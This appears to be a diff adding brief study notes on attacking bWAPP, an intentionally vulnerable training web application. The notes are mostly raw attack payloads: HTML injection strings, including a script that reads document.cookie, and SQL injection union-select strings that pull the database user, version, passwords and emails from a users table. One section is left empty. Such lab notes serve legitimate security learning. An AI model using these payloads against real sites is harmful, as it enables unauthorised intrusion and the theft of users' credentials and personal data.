@@ -1,0 +1,43 @@
+BWAPP COMMANDS  VULNERABILITY  AND PENETRATING TESTING - EH
+
+
+BWAPP Commands (Attacks):
+
+
+i.	(HTML  Injection - Reflected GET = <h1>Aneesh Sharma<h1>
+
+
+ii.	HTML Injection - Reflected POST - <script>alert(document.cookie)</script>
+
+
+
+iii.	BWAPP SQL Injection -Here 2,3,4,5 we can fire sql lite commands
+1.	SQL Injection (GET/Search)-
+
+a.	iron' union select 1,2,3,4,5,6,7 # , 
+b.	iron' union select 1,user(),3,4,5,6,7 #,
+c.	iron' union select 1,2 , @@version,4,5,6,7 #
+
+
+2.	SQL injection(GET/SELECT)- 
+a)union select 1,user(),3,4,5,6,7# - For getting   Username
+
+
+b)union select 1,user(),3,4,password,6,7 from users #  -For getting password
+
+c)union select 1,user(),3,email,password,6,7 from users #    Also extracting email 
+
+
+3.SQL injection(POST/Search):
+
+a)
+
+
+
+
+4SQL injection(POST/Select):
+
+Code : AND 0=1 union select 1,@@version,3,4,5,6,7 -- -&action=go
+
+In the Inspect Element edit the option value 
+
